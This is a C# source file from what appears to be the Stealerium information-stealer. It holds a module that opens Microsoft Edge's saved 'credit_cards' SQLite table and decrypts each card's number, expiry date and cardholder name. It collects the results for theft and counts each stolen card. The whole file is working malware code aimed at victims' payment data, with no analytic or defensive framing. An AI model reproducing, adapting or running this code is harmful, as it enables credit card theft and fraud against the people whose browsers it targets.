using System;
using System.Collections.Generic;
using Stealerium.Helpers;
using Stealerium.Target.Browsers.Chromium;

namespace Stealerium.Target.Browsers.Edge;

internal sealed class CreditCards
{
	public static List<CreditCard> Get(string sWebData)
	{
		List<CreditCard> list = new List<CreditCard>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(sWebData, "credit_cards");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				CreditCard creditCard = default(CreditCard);
				creditCard.Number = Crypto.GetUtf8(Crypto.EasyDecrypt(sWebData, sqLite.GetValue(i, 4)));
				creditCard.ExpYear = Crypto.GetUtf8(Crypto.EasyDecrypt(sWebData, sqLite.GetValue(i, 3)));
				creditCard.ExpMonth = Crypto.GetUtf8(Crypto.EasyDecrypt(sWebData, sqLite.GetValue(i, 2)));
				creditCard.Name = Crypto.GetUtf8(Crypto.EasyDecrypt(sWebData, sqLite.GetValue(i, 1)));
				CreditCard item = creditCard;
				Counter.CreditCards++;
				list.Add(item);
			}
			return list;
		}
		catch (Exception ex)
		{
			Logging.Log("Edge >> Failed collect credit cards\n" + ex);
			return list;
		}
	}
}
